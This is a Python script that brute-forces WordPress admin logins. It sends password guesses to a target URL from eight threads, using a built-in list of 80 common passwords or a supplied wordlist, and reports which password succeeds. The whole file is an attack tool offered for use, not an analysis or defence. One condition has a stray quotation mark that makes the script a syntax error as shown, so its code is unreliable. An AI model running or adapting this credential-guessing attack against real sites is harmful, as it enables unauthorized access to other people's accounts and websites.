import requests
import sys
import threading

x = True
th = list()
out = str()
url = '127.0.0.1'
cookie = {'wordpress_test_cookie': 'WP+Cookie+check'}
data = {
	'log': 'admin',
	'pwd': '',
	'wp-submit': 'Log+In',
	'testcookie': '1'
}

def colsw(col):
	colors = {
		0: "\033[0;0m",		# default terminal color
		1: "\033[0;91m",	# red
		2: "\033[0;92m",	# green
		3: "\033[0;94m"		# blue
	}
	print(colors[col],end='')

def loadpwlsit(filename):
	print(f"\nLoading password list from {filename}\n")
	with open (filename, encoding='Latin1') as f:
		plain_list = f.read()
		pw_list = plain_list.split('\n')
	return pw_list

def passsplit(pwlist, spval, count):
	out = list()
	for i in range(len(pwlist)):
		if (i % spval == count):
			out.append(pwlist[i])
	return out

def brute(passwdlist):
	global out

	for passwd in passwdlist:
		data['pwd'] = passwd
		x = requests.post(url, data = data, cookies = cookie)
		if (('Error' in x.text or 'incorrect' in x.text) and ('password' in x.text or 'Password' in x.text')):
			colsw(1)
			print(f"{data['log']}:{passwd}  -->  ", end='')
			print("Wrong Password")
			colsw(0)
		else:
			colsw(2)
			print(f"{data['log']}:{passwd}  -->  ", end='')
			print("Correct Password")
			colsw(0)
			out = passwd
			x = False
			end(True)


	return False

def end(status):
	colsw(3)
	print(f"\nPassword for user {data['log']} is ", end='')
	if (status):
		colsw(1)
		print(out)
	else:
		colsw(1)
		print("not found")

	colsw(0)
	exit()


def main():
	global url
	global data
	global th
	passwdlist = ['123456', '12345', '123456789', 'password', 'iloveyou', 'princess', '1234567', 'rockyou', '12345678', 'abc123', 'nicole', 'daniel', 'babygirl', 'monkey', 'lovely', 'jessica', '654321', 'michael', 'ashley', 'qwerty', '111111', 'iloveu', '000000', 'michelle', 'tigger', 'sunshine', 'chocolate', 'password1', 'soccer', 'anthony', 'friends', 'butterfly', 'purple', 'angel', 'jordan', 'liverpool', 'justin', 'loveme', 'fuckyou', '123123', 'football', 'secret', 'andrea', 'carlos', 'jennifer', 'joshua', 'bubbles', '1234567890', 'superman', 'hannah', 'amanda', 'loveyou', 'pretty', 'ER28-0652', 'basketball', 'andrew', 'angels', 'tweety', 'flower', 'playboy', 'hello', 'elizabeth', 'hottie', 'tinkerbell', 'charlie', 'samantha', 'barbie', 'chelsea', 'lovers', 'teamo', 'jasmine', 'brandon', '666666', 'shadow', 'melissa', 'eminem', 'matthew', 'robert', 'danielle', 'forever', 'family']
	if (len(sys.argv) == 1):
		print("\npython3 wp-brute.py [utl] [password list (not required)]\n")
		return 1
	if (len(sys.argv) >= 2):
		url = str(sys.argv[1])
	if (len(sys.argv) == 3):
		passwdlist = loadpwlsit(sys.argv[2])
	else:
		print("\nUsing 80 preloaded most known passwords\n")

	login = str(input("Login for wp user (default: admin): ").strip())
	
	print()

	if (len(login)>0):
		data['log'] = login
	
	# status = brute(passwdlist)
	
	z = 8
	for i in range(z):
		th.append(threading.Thread(target=brute, args=(passsplit(passwdlist,z,i),)).start())
	
	return 0

try:	
	main()
except KeyboardInterrupt:
	print("\n\nStopped by Keyboard\n")
